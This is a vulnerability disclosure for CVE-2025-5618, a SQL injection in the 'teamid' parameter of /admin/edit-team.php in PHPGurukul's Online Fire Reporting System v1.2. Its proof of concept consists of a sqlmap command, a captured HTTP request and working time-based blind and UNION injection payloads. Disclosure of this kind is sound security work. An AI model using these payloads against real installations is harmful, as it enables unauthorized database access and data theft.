# CVE-2025-5618

SQLi vulnerability in Online Fire Reporting System v1.2 of file /admin/edit-team.php

**vender**:

- [PHPGurukul](https://vuldb.com/?vendor.phpgurukul)
- Online Fire Reporting System

**SoftLink**:

- [Online Fire Reporting System Project in PHP- PHPGurukul](https://phpgurukul.com/online-fire-reporting-system-using-php-and-mysql/)

**Vulnerable File**

- /admin/edit-team.php

**Version**

- V1.2

### POC

```bash
sqlmap -r request.txt --level 5 --batch
```



```http
GET /admin/edit-team.php?teamid=1 HTTP/1.1
Host: www.firereport.top
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Cookie: PHPSESSID=vhqmp6o0p6p8lf7sscpqhrp6tf
Priority: u=0, i
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:139.0) Gecko/20100101 Firefox/139.0
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
```



```
---
Parameter: teamid (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: teamid=1' AND (SELECT 1771 FROM (SELECT(SLEEP(5)))hXbt)-- lWfl

    Type: UNION query
    Title: Generic UNION query (NULL) - 6 columns
    Payload: teamid=1' UNION ALL SELECT NULL,CONCAT(0x7162626271,0x524a6c6b5067766f4779526a6a6d42504d6f62516143636f50465a6b644767494e49556768496a57,0x717a6a6a71),NULL,NULL,NULL,NULL-- -
---
```

